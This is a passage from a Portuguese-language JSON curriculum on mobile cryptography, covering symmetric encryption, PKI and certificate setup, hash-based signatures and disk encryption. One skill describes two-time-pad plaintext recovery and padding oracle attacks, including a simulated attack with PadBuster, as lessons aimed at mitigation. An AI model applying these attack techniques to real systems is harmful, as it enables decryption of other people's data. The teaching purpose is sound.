                                    "Expor IV ou chave em logs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de finanças móveis, encripte o token de autenticação JWT usando AES-256-GCM antes de armazená-lo no armazenamento local. Ao login, decifre e valide antes de usar em chamadas API, prevenindo acesso offline não autorizado.",
                              "finalVerifications": [
                                "Dados sensíveis são encriptados e só decryptam com a chave correta.",
                                "IV é único e armazenado corretamente com o ciphertext.",
                                "Nenhum erro de padding ou autenticação em testes.",
                                "Performance: encriptação < 100ms para 1KB de dados.",
                                "Chave gerada de forma segura e não exposta.",
                                "Funciona em ambos Android e iOS sem platform-specific bugs."
                              ],
                              "assessmentCriteria": [
                                "Código usa algoritmos padrão (AES-256) com modos seguros (GCM/CBC).",
                                "Gerenciamento correto de chaves e IV (não hardcoded).",
                                "Tratamento de exceções e validação de integridade.",
                                "Testes unitários cobrem 90%+ do código de cripto.",
                                "Conformidade com guidelines OWASP Mobile Top 10.",
                                "Documentação inline no código explicando escolhas."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Álgebra linear e teoria dos números em algoritmos criptográficos.",
                                "Desenvolvimento de Software: Padrões de design para segurança (ex: Factory para chaves).",
                                "Ética e Direito: Conformidade com GDPR/LGPD na proteção de dados pessoais.",
                                "Redes e Sistemas: Integração com TLS para end-to-end encryption.",
                                "Inteligência Artificial: Uso em ML models para encriptar dados de treinamento locais."
                              ],
                              "realWorldApplication": "Apps bancários como Nubank usam criptografia simétrica para proteger saldos e transações locais, prevenindo roubo de dados em caso de perda do dispositivo; mensageiros como Signal aplicam para chats offline."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.1.3",
                            "name": "Avaliar vulnerabilidades em chaves simétricas",
                            "description": "Analisar riscos como reutilização de chaves e ataques de oráculo de padding em contextos móveis, com mitigação via geradores pseudoaleatórios seguros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Criptografia Simétrica e Gerenciamento de Chaves em Dispositivos Móveis",
                                  "subSteps": [
                                    "Estudar a definição de criptografia simétrica e algoritmos comuns como AES e ChaCha20.",
                                    "Analisar o ciclo de vida de chaves simétricas: geração, distribuição, uso e rotação.",
                                    "Explorar limitações de dispositivos móveis, como armazenamento restrito e processamento limitado.",
                                    "Identificar riscos gerais de chaves fracas ou mal gerenciadas em apps móveis.",
                                    "Revisar padrões como NIST SP 800-57 para gerenciamento de chaves."
                                  ],
                                  "verification": "Criar um diagrama do ciclo de vida de uma chave simétrica em um app móvel e listar 3 riscos específicos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação NIST SP 800-57",
                                    "Vídeos Khan Academy sobre criptografia simétrica",
                                    "Biblioteca OpenSSL docs"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo de chaves; foque em AES-256 para mobile.",
                                  "learningObjective": "Dominar conceitos básicos de chaves simétricas e suas peculiaridades em contextos móveis.",
                                  "commonMistakes": [
                                    "Confundir criptografia simétrica com assimétrica",
                                    "Ignorar restrições de hardware móvel",
                                    "Subestimar a importância da entropia na geração"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Vulnerabilidade de Reutilização de Chaves",
                                  "subSteps": [
                                    "Explicar o conceito de 'two-time pad' e por que reutilizar chaves compromete a confidencialidade.",
                                    "Simular cenários em dispositivos móveis onde chaves são reutilizadas (ex: sessões prolongadas).",
                                    "Estudar impactos: recuperação de plaintext via XOR de mensagens cifradas.",
                                    "Analisar casos reais como ataques em protocolos VoIP móveis.",
                                    "Calcular entropia necessária para chaves únicas em apps de alta frequência."
                                  ],
                                  "verification": "Implementar um script simples em Python demonstrando decrypt de duas mensagens com mesma chave.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Python com pycryptodome",
                                    "Exemplos de código GitHub sobre two-time pad",
                                    "Artigo 'Cryptography Engineering' capítulo sobre chaves"
                                  ],
                                  "tips": "Teste com mensagens curtas para observar padrões no ciphertext.",
                                  "learningObjective": "Identificar e quantificar riscos da reutilização de chaves em cenários móveis.",
                                  "commonMistakes": [
                                    "Achar que rotação manual basta sem automação",
                                    "Não considerar nonce/IV reutilizado junto",
                                    "Ignorar side-channels em mobile"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar Ataques de Oráculo de Padding em Contextos Móveis",
                                  "subSteps": [
                                    "Compreender padding PKCS#7 e como oráculos de decrypt vazam informações.",
                                    "Descrever o fluxo do ataque: query iterativa para bytes do plaintext.",
                                    "Adaptar o ataque para protocolos móveis como TLS em apps Android/iOS.",
                                    "Simular um oráculo padding em código para apps com decrypt local.",
                                    "Analisar defesas ausentes em bibliotecas cripto legadas de mobile."
                                  ],
                                  "verification": "Executar um ataque simulado em um servidor local e recuperar uma mensagem secreta.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramenta PadBuster",
                                    "Tutoriais OWASP sobre Padding Oracle",
                                    "Biblioteca BouncyCastle para Java"
                                  ],
                                  "tips": "Comece com CBC mode, comum em mobile antigo; use VMs para simulação segura.",
                                  "learningObjective": "Dominar mecânica de ataques de oráculo de padding e detecção em apps móveis.",
                                  "commonMistakes": [
                                    "Confundir com timing attacks",
                                    "Não validar padding corretamente no código",
                                    "Subestimar impacto em hybrid crypto"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Mitigações com Geradores Pseudoaleatórios Seguros (PRNG)",
                                  "subSteps": [
                                    "Estudar PRNG criptograficamente seguros como Fortuna, Yarrow ou system RNG (Android SecureRandom).",
                                    "Implementar geração de chaves únicas com alta entropia em código móvel.",
                                    "Configurar rotação automática de chaves e uso de nonce/IV frescos.",
                                    "Integrar em um app móvel simulado com bibliotecas como Jetpack Security (Android).",
                                    "Testar mitigação contra reutilização e padding oracle."
                                  ],
                                  "verification": "Gerar 100 chaves e verificar unicidade/entropia; testar app sem vulnerabilidades simuladas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Android Keystore docs",
                                    "iOS CommonCrypto",
                                    "Testes com DIEHARDER para entropia"
                                  ],
                                  "tips": "Sempre seed PRNG com fontes de entropia móvel (sensores + hardware RNG).",
                                  "learningObjective": "Aplicar PRNG seguros para mitigar vulnerabilidades em chaves simétricas móveis.",
                                  "commonMistakes": [
                                    "Usar PRNG fracos como Math.random()",
                                    "Não reseed periodicamente",
                                    "Esquecer de limpar chaves da memória"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app Android de chat simples usando AES-CBC. Primeiro, reutilize a chave para duas mensagens e demonstre recuperação via XOR. Em seguida, implemente padding oracle simulando decrypt inválido. Por fim, migre para AES-GCM com SecureRandom e key rotation automática, testando contra ataques.",
                              "finalVerifications": [
                                "Explicar com precisão o mecanismo de two-time pad e padding oracle.",
                                "Identificar cenários móveis propensos a essas vulnerabilidades.",
                                "Implementar geração de chaves seguras e verificar entropia.",
                                "Propor e codificar mitigações completas em um protótipo móvel.",
                                "Avaliar um código fornecido destacando riscos e fixes.",
                                "Discutir impactos em protocolos reais como WhatsApp encryption."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (80% correto em explicações de vulns).",
                                "Qualidade da implementação prática (código roda sem exploits).",
                                "Profundidade na análise de riscos móveis específicos.",
                                "Criatividade e robustez nas mitigações PRNG.",
                                "Capacidade de verificação e testes automatizados.",
                                "Clareza na documentação de passos e lições aprendidas."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria da Informação e entropia para análise de chaves.",
                                "Programação: Desenvolvimento Android/iOS com bibliotecas cripto.",
                                "Redes: Integração com TLS e protocolos móveis seguros.",
                                "Ética: Implicações de falhas cripto em privacidade de usuários.",
                                "Hardware: Uso de TRNG em SoCs móveis."
                              ],
                              "realWorldApplication": "Em aplicativos bancários móveis como Nubank ou apps de saúde (ex: telemedicina), avaliar e mitigar riscos de chaves simétricas garante proteção contra interceptação de dados sensíveis durante transações, prevenindo fraudes e vazamentos em redes públicas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.3.2",
                        "name": "Criptografia Assimétrica em Dispositivos Móveis",
                        "description": "Aplicação de criptosistemas de chave pública como RSA e ECC para troca segura de chaves e autenticação em comunicações móveis.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.3.2.1",
                            "name": "Compreender princípios de chave pública",
                            "description": "Explicar conceitos de criptografia assimétrica, incluindo assinatura digital e troca de chaves Diffie-Hellman, adaptados a restrições computacionais de dispositivos móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de Criptografia Simétrica vs Assimétrica",
                                  "subSteps": [
                                    "Diferencie criptografia simétrica (uma chave compartilhada) de assimétrica (par de chaves pública/privada).",
                                    "Estude exemplos: AES para simétrica, RSA para assimétrica.",
                                    "Analise problemas da simétrica: distribuição segura de chaves.",
                                    "Compare eficiência computacional em dispositivos móveis.",
                                    "Resuma vantagens da assimétrica para autenticação e confidencialidade."
                                  ],
                                  "verification": "Escreva um parágrafo comparando simétrica e assimétrica, destacando cenários móveis.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Vídeos Khan Academy sobre criptografia básica; diagrama comparativo impresso.",
                                  "tips": "Use analogias como 'casa com uma chave compartilhada' vs 'casa com caixa de correio pública'.",
                                  "learningObjective": "Diferenciar criptografias e identificar quando usar assimétrica em mobiles.",
                                  "commonMistakes": "Confundir chaves simétricas com públicas, ignorando overhead computacional."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender Chaves Pública e Privada",
                                  "subSteps": [
                                    "Defina chave pública (para criptografar) e privada (para descriptografar).",
                                    "Explore matemática básica: exponenciação modular em RSA.",
                                    "Gere um par de chaves usando ferramenta online simulada.",
                                    "Teste criptografia/decrypt com mensagens simples.",
                                    "Discuta segurança: fatoração de números grandes."
                                  ],
                                  "verification": "Criptografe uma mensagem com chave pública e descriptografe com privada usando simulador.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Simulador RSA online (ex: Crypto101); calculadora modular.",
                                  "tips": "Visualize como um 'cadeado aberto' público que só o dono fecha.",
                                  "learningObjective": "Gerar e usar pares de chaves, entendendo seu papel único.",
                                  "commonMistakes": "Reverter papéis das chaves, subestimar tamanho das chaves para segurança."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Assinatura Digital",
                                  "subSteps": [
                                    "Entenda assinatura: hash da mensagem criptografado com chave privada.",
                                    "Verifique: descriptografar com pública e comparar hash.",
                                    "Estude casos: integridade e não-repúdio em apps móveis.",
                                    "Simule assinatura de um documento digital.",
                                    "Analise ataques: colisões de hash."
                                  ],
                                  "verification": "Crie e verifique uma assinatura digital em ferramenta simulada.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramenta online como Digital Signature Simulator; exemplos de certificados X.509.",
                                  "tips": "Pense como 'autógrafo único' que só o dono pode fazer.",
                                  "learningObjective": "Implementar e validar assinaturas para autenticação.",
                                  "commonMistakes": "Confundir assinatura com criptografia, ignorar necessidade de hash."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Dominar Troca de Chaves Diffie-Hellman",
                                  "subSteps": [
                                    "Descreva protocolo: parâmetros públicos, segredos privados, g^x mod p.",
                                    "Calcule chaves compartilhadas manualmente com números pequenos.",
                                    "Compare com ECDH para curvas elípticas em mobiles.",
                                    "Simule troca em rede simulada.",
                                    "Discuta proteção contra man-in-the-middle."
                                  ],
                                  "verification": "Execute troca DH simulada e derive chave compartilhada igual dos dois lados.",
                                  "estimatedTime": "70 minutos",
                                  "materials": "Calculadora gráfica; simulador Diffie-Hellman interativo (ex: Cryptography.io).",
                                  "tips": "Use cores para rastrear valores em diagramas de fluxo.",
                                  "learningObjective": "Calcular e explicar geração de chaves compartilhadas seguras.",
                                  "commonMistakes": "Expor segredos privados, confundir com RSA direto."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Adaptar a Dispositivos Móveis",
                                  "subSteps": [
                                    "Identifique restrições: CPU limitada, bateria, latência.",
                                    "Estude algoritmos leves: Curve25519, EdDSA.",
                                    "Compare performance: RSA vs ECC em benchmarks móveis.",
                                    "Analise implementações em Android/iOS (ex: KeyStore).",
                                    "Planeje uso híbrido: assimétrica para chaves, simétrica para dados."
                                  ],
                                  "verification": "Compare tempos de execução de algoritmos em emulador móvel.",
                                  "estimatedTime": "55 minutos",
                                  "materials": "Emulador Android Studio; benchmarks de libs como BouncyCastle.",
                                  "tips": "Priorize ECC sobre RSA para mobiles devido a chaves menores.",
                                  "learningObjective": "Selecionar criptografia otimizada para constraints móveis.",
                                  "commonMistakes": "Usar algoritmos pesados sem otimização, ignorar side-channel attacks."
                                }
                              ],
                              "practicalExample": "Em um app de chat móvel como Signal, use DH para trocar chaves de sessão inicialmente (chave pública exposta), assine mensagens com chave privada para verificar identidade, e criptografe payload com chave simétrica derivada, tudo otimizado com ECC para rodar suave em smartphones.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo completo de uma troca segura em mobile.",
                                "Gerar e usar par de chaves em simulador sem erros.",
                                "Identificar falhas em cenários hipotéticos de ataque.",
                                "Comparar DH e assinatura em diagrama.",
                                "Listar 3 adaptações móveis para assimétrica.",
                                "Simular assinatura e verificação em ferramenta."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: 90% acerto em definições chave.",
                                "Compreensão prática: Sucesso em simulações sem orientação.",
                                "Adaptação móvel: Identificar corretamente otimizações.",
                                "Análise de segurança: Detectar vulnerabilidades comuns.",
                                "Clareza explicativa: Diagrama ou resumo lógico.",
                                "Profundidade: Incluir matemática básica onde aplicável."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos Números e Logaritmos Discretos.",
                                "Programação: Implementação em Java/Kotlin para Android.",
                                "Redes: Protocolos TLS/HTTPS em comunicações móveis.",
                                "Física/Engenharia: Otimização de energia em dispositivos embarcados."
                              ],
                              "realWorldApplication": "Em apps bancários móveis (ex: Caixa Tem), usa-se criptografia assimétrica para autenticação segura de transações via assinatura digital, com DH para sessões efêmeras, garantindo proteção contra interceptação em redes Wi-Fi públicas sem drenar bateria rapidamente."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.2.2",
                            "name": "Configurar certificados e chaves assimétricas",
                            "description": "Gerar pares de chaves RSA/ECC e integrar com PKI em apps móveis para autenticação mútua.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de Chaves Assimétricas e PKI",
                                  "subSteps": [
                                    "Estude os princípios de criptografia assimétrica RSA (baseado em fatoração de primos) e ECC (curvas elípticas para eficiência em dispositivos móveis).",
                                    "Aprenda componentes de PKI: CA raiz, CA intermediária, certificados X.509, CRL/OCSP para revogação.",
                                    "Revise autenticação mútua: client autentica server e vice-versa usando certificados.",
                                    "Explore diferenças de performance RSA vs ECC em apps móveis (ECC mais leve para bateria/CPU).",
                                    "Identifique formatos de chaves: PEM, DER, PKCS#12."
                                  ],
                                  "verification": "Resuma em um diagrama os fluxos de autenticação mútua e compare RSA/ECC em um documento de 1 página.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação OpenSSL",
                                    "RFC 5280 (X.509)",
                                    "Tutoriais Mozilla PKI"
                                  ],
                                  "tips": "Use ferramentas visuais como draw.io para mapear PKI hierarchy.",
                                  "learningObjective": "Compreender os conceitos teóricos para gerar e usar chaves/certificados corretamente.",
                                  "commonMistakes": [
                                    "Confundir chaves públicas/privadas",
                                    "Ignorar revogação de certificados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Pares de Chaves RSA e ECC",
                                  "subSteps": [
                                    "Instale OpenSSL ou BouncyCastle para geração de chaves.",
                                    "Gere par RSA: `openssl genrsa -out private_rsa.key 2048` e chave pública: `openssl rsa -in private_rsa.key -pubout -out public_rsa.pub`.",
                                    "Gere par ECC: `openssl ecparam -genkey -name prime256v1 -out private_ecc.key` e extraia pública.",
                                    "Converta para formatos móveis: PKCS#12 com `openssl pkcs12 -export`.",
                                    "Valide chaves com `openssl rsa -in private_rsa.key -check` ou equivalente ECC."
                                  ],
                                  "verification": "Execute comandos e confirme chaves válidas sem erros; gere hashes para verificação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Ambiente Linux/Mac ou WSL",
                                    "Editor de texto para PEM"
                                  ],
                                  "tips": "Use curvas NIST P-256 para ECC em mobiles por compatibilidade.",
                                  "learningObjective": "Gerar chaves assimétricas seguras e exportáveis para apps móveis.",
                                  "commonMistakes": [
                                    "Usar tamanhos fracos como RSA 1024",
                                    "Expor chaves privadas em logs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar e Configurar Certificados com PKI",
                                  "subSteps": [
                                    "Gere Certificate Signing Request (CSR): `openssl req -new -key private_rsa.key -out client.csr`.",
                                    "Use CA auto-assinada para testes: `openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -out client.crt`.",
                                    "Assine para ECC similarmente, garantindo chain of trust.",
                                    "Crie keystore: Android Keystore ou iOS Keychain importando PKCS#12.",
                                    "Configure truststore com CA pública no app móvel."
                                  ],
                                  "verification": "Verifique certificado: `openssl x509 -in client.crt -text -noout`; confira validade e subject.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "OpenSSL",
                                    "CA de teste (gerada previamente)",
                                    "Android Studio ou Xcode para keystore preview"
                                  ],
                                  "tips": "Sempre inclua SAN (Subject Alternative Name) para hostnames em mobiles.",
                                  "learningObjective": "Emitir e assinar certificados válidos integrados a PKI.",
                                  "commonMistakes": [
                                    "CSR sem chave privada correspondente",
                                    "Certificados auto-assinados em produção"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Certificados em App Móvel para Autenticação Mútua",
                                  "subSteps": [
                                    "Em Android: Carregue keystore com KeyStore.getInstance('PKCS12'); configure SSLContext com KeyManager e TrustManager.",
                                    "Em iOS: Use SecIdentity e SecTrust para load certificates no app.",
                                    "Implemente HttpsURLConnection ou OkHttp com custom SSLSocketFactory para mutual TLS.",
                                    "Teste handshake: client envia cert, server valida; server cert validado por client.",
                                    "Adicione pinning de certificado ou OCSP stapling para segurança extra."
                                  ],
                                  "verification": "Execute app contra server mock; logs mostram handshake bem-sucedido sem erros de cert.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Android Studio/Xcode",
                                    "Servidor de teste com OpenSSL s_server",
                                    "Bibliotecas: OkHttp (Android), URLSession (iOS)"
                                  ],
                                  "tips": "Use Network Security Config no Android para trust anchors.",
                                  "learningObjective": "Implementar autenticação mútua funcional em apps móveis.",
                                  "commonMistakes": [
                                    "TrustManager aceitando qualquer cert",
                                    "Não liberar recursos de keystore"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar Configuração Completa",
                                  "subSteps": [
                                    "Simule ataques: tente autenticação sem cert privado, com cert revogado.",
                                    "Meça performance: tempo de handshake RSA vs ECC em device real.",
                                    "Monitore logs com Wireshark para capturar TLS handshake.",
                                    "Implemente rotação de chaves: gere novo par e reconfigure.",
                                    "Documente processo em README para reprodutibilidade."
                                  ],
                                  "verification": "Testes passam: autenticação falha sem certs válidos; performance < 500ms.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Wireshark",
                                    "Device físico para testes mobile",
                                    "Postman com client cert"
                                  ],
                                  "tips": "Teste em emulador E debugável keystore primeiro.",
                                  "learningObjective": "Garantir robustez e segurança da implementação.",
                                  "commonMistakes": [
                                    "Ignorar erros de handshake em produção",
                                    "Testes só em localhost"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app móvel de chat seguro onde o client (Android/iOS) usa certificado ECC para autenticar mutuamente com um server Node.js, trocando mensagens criptografadas apenas após handshake TLS bem-sucedido.",
                              "finalVerifications": [
                                "Pares de chaves RSA/ECC gerados e validados sem erros.",
                                "Certificados assinados com chain de confiança completa.",
                                "App móvel completa handshake mTLS com server.",
                                "Autenticação falha corretamente com chaves/cert inválidos.",
                                "Performance de ECC superior a RSA em device móvel.",
                                "Logs e Wireshark confirmam tráfego TLS 1.3 com certs."
                              ],
                              "assessmentCriteria": [
                                "Correção técnica na geração de chaves e certificados (100% match com comandos).",
                                "Integração funcional em app móvel sem crashes ou warnings de segurança.",
                                "Tratamento de erros robusto (ex: cert expirado, revogado).",
                                "Eficiência: uso de ECC otimizado para mobile.",
                                "Documentação clara com passos reproduzíveis.",
                                "Testes abrangentes cobrindo cenários edge."
                              ],
                              "crossCurricularConnections": [
                                "Programação Móvel: Integração com Android Keystore/iOS SecKey.",
                                "Redes: Protocolos TLS/DTLS e análise de pacotes.",
                                "Matemática: Fundamentos de curvas elípticas e aritmética modular.",
                                "Desenvolvimento de Software: Gerenciamento de segredos e CI/CD com chaves."
                              ],
                              "realWorldApplication": "Em apps bancários móveis (ex: autenticação client-side para transações), VPNs móveis corporativas e IoT devices para comunicação segura sem senhas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.2.3",
                            "name": "Integrar funções hash com assimétrica",
                            "description": "Combinar hashes como SHA-256 com assinaturas digitais para verificar integridade de dados móveis em trânsito.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de Hash e Criptografia Assimétrica",
                                  "subSteps": [
                                    "Estude o funcionamento de funções hash como SHA-256: entrada de dados arbitrários produz saída fixa de 256 bits.",
                                    "Revise criptografia assimétrica: pares de chaves pública/privada, assinatura digital usando RSA ou ECDSA.",
                                    "Analise o processo de assinatura: hash dos dados + encriptação do hash com chave privada.",
                                    "Explore verificação: decriptar assinatura com chave pública, comparar com novo hash dos dados.",
                                    "Identifique benefícios para integridade em trânsito: detecção de alterações sem revelar conteúdo."
                                  ],
                                  "verification": "Resuma em um diagrama os fluxos de assinatura e verificação; explique oralmente ou por escrito.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação SHA-256 (NIST), tutoriais OpenSSL ou BouncyCastle, diagramas de fluxo (Draw.io).",
                                  "tips": "Use analogias como 'carimbo digital' para hash e 'assinatura com caneta secreta' para chave privada.",
                                  "learningObjective": "Dominar conceitos teóricos para basear implementação prática.",
                                  "commonMistakes": "Confundir hash com encriptação (hash é unidirecional); ignorar colisões raras em SHA-256."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Hash e Assinar Dados",
                                  "subSteps": [
                                    "Prepare dados de exemplo (ex: JSON de config móvel).",
                                    "Implemente geração de hash SHA-256 usando biblioteca (Crypto em JS/Node ou Java Security).",
                                    "Gere par de chaves assimétricas (RSA 2048 bits ou ECDSA).",
                                    "Crie assinatura: hash dos dados + sign com chave privada.",
                                    "Salve assinatura e dados em formato para trânsito (ex: base64)."
                                  ],
                                  "verification": "Execute código; confirme hash corresponde e assinatura é válida via ferramenta de verificação.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ambiente dev (Node.js/Python/Java), bibliotecas crypto (crypto-js, cryptography.io), editor de código.",
                                  "tips": "Sempre normalize dados antes de hash (UTF-8, sem espaços extras).",
                                  "learningObjective": "Implementar assinatura de hash para garantir integridade.",
                                  "commonMistakes": "Usar chave pública para assinar; não codificar corretamente para trânsito (use base64)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Verificação de Assinatura",
                                  "subSteps": [
                                    "Receba dados, assinatura e chave pública simulando trânsito móvel.",
                                    "Re-gerar hash SHA-256 dos dados recebidos.",
                                    "Verifique assinatura: decriptar com pública e comparar hashes.",
                                    "Adicione lógica de falha: rejeitar se hashes diferem.",
                                    "Teste com dados alterados para validar detecção de integridade violada."
                                  ],
                                  "verification": "Teste casos: dados intactos (OK), alterados (falha); logue resultados.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Mesmo ambiente do step 2, scripts de teste unitário (Jest/Pytest).",
                                  "tips": "Use constantes de tempo para evitar ataques de timing em verificação.",
                                  "learningObjective": "Construir mecanismo de verificação robusto para dados em trânsito.",
                                  "commonMistakes": "Comparar strings sem canonicalização; vazar chave privada em logs."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Contexto de Dispositivos Móveis",
                                  "subSteps": [
                                    "Integre em app móvel simulado (React Native/Flutter ou Android/iOS native).",
                                    "Assine payloads de API móvel (ex: dados de sensor).",
                                    "Implemente verificação no receptor móvel antes de processar.",
                                    "Otimize para mobile: use hardware crypto se disponível (Android KeyStore).",
                                    "Teste em emulador com rede simulada (perda de pacotes)."
                                  ],
                                  "verification": "App rejeita dados inválidos; monitore logs e performance.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Flutter/React Native setup, emuladores Android/iOS, Postman para simular API.",
                                  "tips": "Evite bloquear UI thread; use async para crypto ops.",
                                  "learningObjective": "Adaptar integração para constraints de computação móvel.",
                                  "commonMistakes": "Ignorar bateria/CPU: SHA-256 é custoso; não testar offline."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Depurar e Documentar",
                                  "subSteps": [
                                    "Crie suíte de testes: válido, inválido, tamanhos variados.",
                                    "Depure cenários de falha (chaves trocadas, rede ruim).",
                                    "Meça performance em device real.",
                                    "Documente código com fluxogramas e instruções de uso.",
                                    "Avalie segurança com ferramentas como OWASP ZAP."
                                  ],
                                  "verification": "100% testes passam; relatório de performance e segurança.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de teste (JUnit, Detox), profiler móvel (Android Profiler).",
                                  "tips": "Automatize testes de regressão para futuras mudanças.",
                                  "learningObjective": "Garantir implementação production-ready.",
                                  "commonMistakes": "Testar só casos felizes; esquecer documentação."
                                }
                              ],
                              "practicalExample": "Em um app de saúde móvel, assine o hash de dados de sensores (batimentos cardíacos) com SHA-256 + ECDSA antes de enviar para servidor. No receptor, verifique para garantir que dados não foram alterados em trânsito Wi-Fi público.",
                              "finalVerifications": [
                                "Assinatura gerada corretamente e verifica sem erros em dados intactos.",
                                "Verificação falha consistentemente em dados alterados (mesmo 1 bit).",
                                "Performance aceitável: <500ms em device mid-range.",
                                "Integração móvel não crasha em cenários de rede fraca.",
                                "Documentação cobre setup de chaves e uso.",
                                "Nenhuma chave privada exposta em código ou logs."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: explicação correta de hash + assimétrica (80%).",
                                "Implementação funcional: código passa todos testes (100%).",
                                "Otimização móvel: uso eficiente de recursos (bateria/CPU).",
                                "Robustez: lida com edge cases (dados vazios, grandes).",
                                "Segurança: segue best practices (sem hardcode chaves).",
                                "Clareza: código legível com comentários."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria dos números (primos, curvas elípticas em ECDSA).",
                                "Programação: Manipulação de binários, bibliotecas crypto.",
                                "Redes: Protocolos TLS/HTTPS que usam assinaturas semelhantes.",
                                "Ética: Privacidade de dados em apps móveis."
                              ],
                              "realWorldApplication": "Apps bancários móveis assinam transações com hash+assinatura para prevenir fraudes em trânsito; atualizações de firmware IoT verificam integridade contra ataques man-in-the-middle."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.3.3",
                        "name": "Proteção de Dados em Repouso e Trânsito",
                        "description": "Estratégias para criptografar dados armazenados localmente e em comunicação, usando combinações de simétrica e assimétrica em ambientes móveis.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.3.3.1",
                            "name": "Proteger dados em repouso",
                            "description": "Implementar criptografia de disco completo (FDE) como FileVault ou dm-crypt em dispositivos móveis, com gerenciamento de chaves via Keystore.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de FDE e Gerenciamento de Chaves",
                                  "subSteps": [
                                    "Estude o conceito de Full Disk Encryption (FDE) e sua importância para dados em repouso em dispositivos móveis.",
                                    "Compare ferramentas: dm-crypt/LUKS para Android/Linux móvel e criptografia nativa do iOS (equivalente a FileVault em macOS).",
                                    "Aprenda sobre Android Keystore para armazenamento seguro de chaves criptográficas.",
                                    "Identifique riscos de dados em repouso, como perda física de dispositivo.",
                                    "Revise melhores práticas NIST para criptografia em mobiles (SP 800-111)."
                                  ],
                                  "verification": "Crie um resumo de 1 página com definições, comparações e riscos identificados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação oficial Android Keystore (developer.android.com)",
                                    "Guia NIST SP 800-111",
                                    "Browser para pesquisa"
                                  ],
                                  "tips": "Use diagramas para visualizar como FDE protege partições inteiras.",
                                  "learningObjective": "Dominar conceitos teóricos de FDE e Keystore para implementação segura.",
                                  "commonMistakes": [
                                    "Confundir FDE com criptografia por arquivo (ex: Android FBE vs FDE).",
                                    "Ignorar overhead de performance em dispositivos low-end.",
                                    "Subestimar necessidade de backup antes da criptografia."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar Ambiente e Dispositivo Móvel",
                                  "subSteps": [
                                    "Configure um emulador Android (AVD no Android Studio) ou dispositivo físico com root (para dm-crypt).",
                                    "Faça backup completo de dados existentes.",
                                    "Instale ferramentas necessárias: Android Studio, adb, e pacotes dm-crypt se rootado.",
                                    "Verifique suporte a FDE no dispositivo/emulador (Android 6+).",
                                    "Gere uma chave mestra forte usando ferramentas como openssl."
                                  ],
